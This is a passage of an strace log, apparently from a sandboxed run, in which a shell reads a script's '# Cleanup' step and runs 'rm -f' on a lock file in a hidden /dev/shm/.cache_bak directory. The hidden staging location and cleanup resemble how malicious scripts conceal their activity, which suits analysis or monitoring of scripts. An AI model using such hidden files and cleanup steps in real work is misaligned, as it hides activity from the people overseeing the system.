24    10:07:56.533309 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, NULL, 8) = 0
24    10:07:56.534261 exit_group(0)     = ?
24    10:07:56.536905 +++ exited with 0 +++
9     10:07:56.537236 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 24
9     10:07:56.537681 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:56.538404 ioctl(2<pipe:[78066]>, TIOCGWINSZ, 0x7ffe4bfa9910) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:56.539155 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:56.539908 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=24, si_uid=1001, si_status=0, si_utime=0, si_stime=7 /* 0.07 s */} ---
9     10:07:56.540266 wait4(-1, 0x7ffe4bfa9290, WNOHANG, NULL) = 0
9     10:07:56.541021 rt_sigreturn({mask=[]}) = 0
9     10:07:56.541752 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:56.542564 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.543323 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.544295 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.545067 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.545760 read(0<pipe:[79132]>, "#", 1) = 1
9     10:07:56.546361 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.546960 read(0<pipe:[79132]>, "C", 1) = 1
9     10:07:56.547585 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:56.548307 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:56.549016 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:56.549814 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:56.550806 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:56.551724 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:56.552655 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:56.553341 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.554213 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.555075 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.555936 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.556707 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:56.557482 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:56.558235 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.558991 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:56.559713 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:56.560444 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:56.561139 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:56.561851 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:56.562544 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:56.563208 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:56.563875 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:56.564605 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:56.565308 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:56.566110 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:56.566762 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:56.567602 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:56.568422 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:56.569134 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:56.569799 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:56.570411 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:56.571005 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:56.571704 read(0<pipe:[79132]>, "_", 1) = 1
9     10:07:56.572392 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:56.572943 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:56.573491 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:56.574032 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:56.574577 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:56.575181 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:56.575915 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:56.576580 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:56.577148 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:56.577748 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:56.578300 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:56.578870 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:56.579439 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:56.579995 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:56.580590 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:56.581151 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:56.581584 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:56.581997 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/rm", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:56.582512 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/rm", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:56.582921 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/rm", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:56.583315 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     10:07:56.583839 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     10:07:56.584432 geteuid()         = 1001
9     10:07:56.584867 getegid()         = 1001
9     10:07:56.585411 getuid()          = 1001
9     10:07:56.586049 getgid()          = 1001
9     10:07:56.586600 access("/usr/bin/rm", X_OK) = 0
9     10:07:56.587125 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/rm", {st_mode=S_IFREG|0755, st_size=59912, ...}, 0) = 0
9     10:07:56.587650 geteuid()         = 1001
9     10:07:56.588200 getegid()         = 1001
9     10:07:56.588848 getuid()          = 1001
9     10:07:56.589341 getgid()          = 1001
9     10:07:56.589818 access("/usr/bin/rm", R_OK) = 0
9     10:07:56.590345 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:56.590817 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:56.591368 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 26
26    10:07:56.592426 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:56.592700 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
26    10:07:56.592957 <... set_robust_list resumed>) = 0
9     10:07:56.593161 <... rt_sigprocmask resumed>NULL, 8) = 0
26    10:07:56.593418 getpid( <unfinished ...>
9     10:07:56.593666 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
26    10:07:56.593928 <... getpid resumed>) = 26
9     10:07:56.594149 <... rt_sigprocmask resumed>[], 8) = 0
26    10:07:56.594376 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:56.594629 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
26    10:07:56.594874 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:56.595139 <... rt_sigprocmask resumed>NULL, 8) = 0
26    10:07:56.595385 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:56.595655 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
26    10:07:56.595932 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:56.596171 <... rt_sigprocmask resumed>[], 8) = 0
26    10:07:56.596440 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:56.596716 rt_sigaction(SIGINT, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
26    10:07:56.596962 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:56.597180 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
26    10:07:56.597415 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:56.597650 wait4(-1,  <unfinished ...>
26    10:07:56.597859 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
26    10:07:56.598118 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
26    10:07:56.598552 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
26    10:07:56.598959 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
26    10:07:56.599358 execve("/usr/bin/rm", ["rm", "-f", "/dev/shm/.cache_bak/update.lock"], 0x5dc497af3550 /* 8 vars */) = 0
26    10:07:56.600317 brk(NULL)         = 0x5cc182e65000
26    10:07:56.600872 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x769e320fa000
26    10:07:56.601495 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
26    10:07:56.602480 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
26    10:07:56.603112 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
26    10:07:56.603848 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x769e320f5000
26    10:07:56.604316 mmap(0x769e320f6000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x769e320f6000
26    10:07:56.604725 mmap(0x769e320f7000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x769e320f7000
26    10:07:56.605126 mmap(0x769e320f8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x769e320f8000
26    10:07:56.605544 close(3</usr/lib/libfake_tracer.so>) = 0
26    10:07:56.605934 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
26    10:07:56.606337 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
26    10:07:56.606769 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
26    10:07:56.607193 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x769e320f3000
26    10:07:56.607701 close(3</etc/ld.so.cache>) = 0
26    10:07:56.608187 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
26    10:07:56.608615 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
26    10:07:56.609029 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
26    10:07:56.609428 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
26    10:07:56.609829 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
26    10:07:56.610227 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x769e31ee1000
26    10:07:56.610627 mmap(0x769e31f09000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x769e31f09000
26    10:07:56.611040 mmap(0x769e32091000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x769e32091000
26    10:07:56.611440 mmap(0x769e320e0000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x769e320e0000
26    10:07:56.612093 mmap(0x769e320e6000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x769e320e6000
26    10:07:56.612817 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
26    10:07:56.613489 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x769e31ede000
26    10:07:56.614026 arch_prctl(ARCH_SET_FS, 0x769e31ede740) = 0
26    10:07:56.614416 set_tid_address(0x769e31edea10) = 26
26    10:07:56.614802 set_robust_list(0x769e31edea20, 24) = 0
26    10:07:56.615185 rseq(0x769e31edf060, 0x20, 0, 0x53053053) = 0
26    10:07:56.615651 mprotect(0x769e320e0000, 16384, PROT_READ) = 0
26    10:07:56.616125 mprotect(0x769e320f8000, 4096, PROT_READ) = 0
26    10:07:56.616616 mprotect(0x5cc1519f2000, 4096, PROT_READ) = 0
26    10:07:56.617058 mprotect(0x769e32132000, 8192, PROT_READ) = 0
26    10:07:56.617806 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
26    10:07:56.618558 munmap(0x769e320f3000, 7295) = 0
26    10:07:56.619247 getrandom("\xa0\x0e\xd6\xdf\x93\xf5\xd9\x24", 8, GRND_NONBLOCK) = 8
26    10:07:56.619791 brk(NULL)         = 0x5cc182e65000
26    10:07:56.620236 brk(0x5cc182e86000) = 0x5cc182e86000
26    10:07:56.620660 ioctl(0<pipe:[79132]>, TCGETS, 0x7fffe3507320) = -1 ENOTTY (Inappropriate ioctl for device)
26    10:07:56.621087 newfstatat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", {st_mode=S_IFREG|000, st_size=0, ...}, AT_SYMLINK_NOFOLLOW) = 0
26    10:07:56.621510 unlinkat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", 0) = 0
26    10:07:56.621949 lseek(0<pipe:[79132]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
26    10:07:56.622368 close(0<pipe:[79132]>) = 0
26    10:07:56.622760 close(1<pipe:[78065]>) = 0
26    10:07:56.623158 close(2<pipe:[78066]>) = 0
26    10:07:56.623564 exit_group(0)     = ?
26    10:07:56.624404 +++ exited with 0 +++
9     10:07:56.624679 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 26
9     10:07:56.624983 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:56.625488 ioctl(2<pipe:[78066]>, TIOCGWINSZ, 0x7ffe4bfa9910) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:56.625894 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:56.626289 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=26, si_uid=1001, si_status=0, si_utime=0, si_stime=1 /* 0.01 s */} ---
9     10:07:56.626490 wait4(-1, 0x7ffe4bfa9290, WNOHANG, NULL) = 0
9     10:07:56.626875 rt_sigreturn({mask=[]}) = 0
9     10:07:56.627275 read(0<pipe:[79132]>, "", 1) = 0
9     10:07:56.627923 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:56.628525 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:56.629034 exit_group(0)     = ?
9     10:07:56.630058 +++ exited with 0 +++
21    10:07:57.418282 <... clock_nanosleep resumed>0x7fffef8d1820) = 0
21    10:07:57.419449 close(1<pipe:[78065]>) = 0
21    10:07:57.420245 close(2<pipe:[78066]>) = 0
21    10:07:57.420818 exit_group(0)     = ?
21    10:07:57.421862 +++ exited with 0 +++
